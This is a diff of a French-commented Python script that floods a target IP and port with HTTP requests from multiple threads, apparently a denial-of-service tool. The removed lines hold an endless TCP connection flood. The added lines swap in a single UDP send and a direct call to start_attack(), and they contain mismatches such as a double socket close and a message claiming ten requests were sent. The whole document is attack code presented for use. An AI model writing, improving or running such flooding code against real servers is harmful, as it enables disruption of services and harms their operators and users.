@@ -19,7 +19,7 @@ except ImportError:
 
 
 # Nombre de requêtes à envoyer
-REQUESTS=10  # Modifiez ce nombre selon vos besoins
+REQUESTS=1  #nombre de threads (request en parallel)
 
 
 
@@ -50,26 +50,44 @@ except ValueError:
 
 def attack(target_ip, target_port):
     """Fonction pour envoyer des requêtes massives à l'adresse IP et au port cibles."""
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Création d'un socket TCP
-            s.connect((target_ip, target_port))  # Connexion au serveur cible
-            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))  # Envoi d'une requête HTTP
-            s.sendto(("Host: {}\r\n\r\n".format(target_ip)).encode('ascii'), (target_ip, target_port))  # Envoi de l'en-tête Host
-            s.close()  # Fermeture du socket
-        except Exception as e:
-            print(f"Erreur de connexion : {e}")  # Affichage de l'erreur en cas de problème de connexion
-            break
+    try:
+        
+        
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Création d'un socket UDP
+        message = ("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)).encode('ascii')  # Préparation du message
+        s.sendto(message, (target_ip, target_port))  # Envoi du message au serveur cible
+        s.close()  # Fermeture du socket
+        
+
+        # Fermeture du socket
+        s.close()
+    except Exception as e:
+        print(f"Erreur de connexion : {e}")
+
+
 
 def start_attack():
     """Démarrage de plusieurs threads pour simuler une charge sur le serveur cible."""
+    print("coucou")
     try:
         print(f"Lancement de l'attaque sur {target_ip}:{target_port}")
         print("10 HTTP REQUEST SENT TO THE SERVER")
         for i in range(REQUESTS):  # Ajustez le nombre de threads en fonction de vos besoins
-            thread = threading.Thread(target=attack, args=(target_ip, target_port))  # Création d'un thread pour chaque attaque
-            thread.start()  # Démarrage du thread
+            try:
+                
+                thread = threading.Thread(target=attack, args=(target_ip, target_port))  # Création d'un thread pour chaque attaque
+                thread.start()  # Démarrage du thread
+            except Exception as e:
+                print(e)
+
+
     except KeyboardInterrupt:
         print("\nArrêt manuel de l'attaque.")  # Message affiché en cas d'interruption manuelle
         sys.exit()
+
+
+
+start_attack()  
+
+
 
